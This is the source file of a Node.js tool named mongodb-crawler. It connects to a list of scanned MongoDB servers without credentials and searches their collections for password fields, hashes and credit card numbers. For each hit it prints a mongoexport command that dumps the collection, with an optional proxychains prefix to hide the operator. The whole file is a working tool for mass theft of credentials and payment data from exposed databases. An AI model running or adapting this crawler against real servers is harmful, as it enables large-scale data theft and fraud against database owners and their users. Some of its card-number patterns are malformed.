// This file is part of mongodb-crawler
// Copyright (c) 2015 szalwia <szalwiaxd@gmail.com>
// License: ISC
var async = require('async');
var MongoClient = require('mongodb').MongoClient;
var fs = require('fs');
var domain = require('domain');
var flatten = require('flat');
var shellescape = require('shell-escape');

var argv = require('yargs')
  .usage('Usage: $0 <mongodblist.txt> [option]')
  .demand(1)
  .alias('threads', 't')
  .describe('threads', 'Number of servers to connect to in parallel')
  .default('threads', 10)
  .alias('prefix', 'p')
  .describe('prefix', 'Prefix to add before mongoexport commands (i.e. proxychains)')
  .string('prefix')
  .default('prefix', '')
  .argv;

// Define patterns to look for in the database.
var dataPatterns = [
  /^[a-f0-9]{32}$/i, // MD5 hashes
  /^[a-f0-9]{40}$/i, // SHA1 hashes
  /^[a-f0-9]{56}$/i, // SHA224 hashes
  /^[a-f0-9]{64}$/i, // SHA256 hashes
  /^[a-f0-9]{64}$/i, // SHA256 hashes
  /^[a-f0-9]{96}$/i, // SHA384 hashes
  /^[a-f0-9]{128}$/i, // SHA512 hashes
  /^4[0-9]{12}(?:[0-9]{3})?$/, // Visa
  /^5[1-5][0-9]{14}$/, // MasterCard
  /^3[47][0-9]{13}^/, // American Express
  /^3(?:0[0-5]|[68][0-9])[0-9]{11}$/, // Diners Club
  /^6(?:011|5[0-9]{2})[0-9]{12}$/, // Discover
  /^^(?:2131|1800|35\d{3})\d{11}$/ // JCB
];

// Define keys to look for in the database.
var keyPatterns = [
  /password/i,
  /hash/i,
  /salt/i,
  /mail/i
];

// Define collections to look for in the database.
var collectionPatterns = [
  /user/i,
  /cred/i,
  /account/i
];

// Load mongodb server list file.
var mongols = fs.readFileSync(argv._[0], {encoding: 'utf8'});
mongols = mongols.split("\n");

// Parse scanner JSON.
for (var i in mongols) {
  if (mongols[i].length > 0) {
    mongols[i] = JSON.parse(mongols[i].trim());
  } else {
    mongols.splice(i,1);
  }
}

async.forEachOfLimit(mongols, argv.threads, function (value, key, callback) {
  var url = 'mongodb://'+value.ip+'/test';
  var done = false;

  // Create a domain to call callback() on unhandled errors.
  var d = domain.create();
  d.on('error', function (err) {
    console.error("Unhandled error while connecting to " + value.ip + ": " + JSON.stringify(err));
    if (!done) { done = true; callback(); }
  });

  // Run the main logic inside the newly created domain.
  d.run(function() {
    MongoClient.connect(url, function (err,db) {
      if (err) {
        console.error("Could not connect to " + value.ip + ". Error: " + JSON.stringify(err));
        if (!done) { done = true; callback(); }
        return;
      }

      // Connect to each database on the server.
      async.eachSeries(value.databases.databases, function (dbInfo, callback) {
        // Get the db object for current database.
        var myDb = db.db(dbInfo.name);
        // Get list of collections for the current database.
        myDb.collections(function (err, collections) {
          if (err) {
            console.error("Error when getting list of collections from " + value.ip+"/"+dbInfo.name + ". Error: " + JSON.stringify(err));
            callback();
            return;
          }

          // Get one item from each collection and run tests on it.
          async.eachSeries(collections, function (collectionInfo, callback) {
            // If collection name matches one of the desired patterns, fetch it.
            for (var p in collectionPatterns) {
              if (collectionPatterns[p].test(collectionInfo.collectionName)) {
                printMongoExportCmd(value.ip, dbInfo.name, collectionInfo.collectionName, "Collection name " + collectionInfo.collectionName + " matched pattern " + collectionPatterns[p].toString());
                callback();
                return;
              }
            }
            var collection = myDb.collection(collectionInfo.collectionName);
            collection.findOne({}, function (err, result) {
              if (err) {
                console.error("Error when processing data from collection" + value.ip + "/" + dbInfo.name + "/" + collectionInfo.collectionName + ". Error: " + JSON.stringify(err));
                callback();
                return;
              }
              if (!result) {
                callback();
                return;
              }

              // Flatten the result hierarchy.
              result = flatten(result);

              var keys = Object.keys(result);
              for (var i in keys) {
                // Check if any of the keys match the predefined patterns.
                for (var j in keyPatterns) {
                  if (keyPatterns[j].test(keys[i])) {
                    printMongoExportCmd(value.ip, dbInfo.name, collectionInfo.collectionName, "Key " + keys[i] + " matched pattern " + keyPatterns[j].toString());
                    callback();
                    return;
                  }
                }
                if (typeof result[keys[i]] !== "string") {
                  continue;
                }
                // Check if any of the string values match the predefined patterns.
                for (var k in dataPatterns) {
                  if (dataPatterns[k].test(result[keys[i]])) {
                    printMongoExportCmd(value.ip, dbInfo.name, collectionInfo.collectionName, "Value matched pattern " + dataPatterns[k].toString());
                    callback();
                    return;
                  }
                }
              }

              callback();
            });
          }, function (err) {
            if (err) {
              console.error("Error processing collections from " + value.ip+"/"+dbInfo.name + ". Error: " + JSON.stringify(err));
            }
            callback();
          });
        });

      }, function (err) {
        if (err) {
          console.error("Error while crawling " + value.ip + ": " + JSON.stringify(err));
        }
        console.error("Done with " + value.ip + "(" + key + "/" + mongols.length + ") " + Math.round(key/mongols.length*100) + "%");
        db.close();
        if (!done) { done = true; callback(); }
      });
    });

  });

}, function (err) {
  if (err) {
    console.error("Something fucked up: " + JSON.stringify(err));
    process.exit(1);
  }
  process.exit(0);
});

function printMongoExportCmd (ip, database, collection, reason) {
  var args = [argv.prefix, 'mongoexport', '--host', ip, '-d', database, '-c', collection, '--jsonArray', '--out', ip + "_" + database + "_" + collection + ".json"];
  console.log(shellescape(args) + " # " + reason);
}
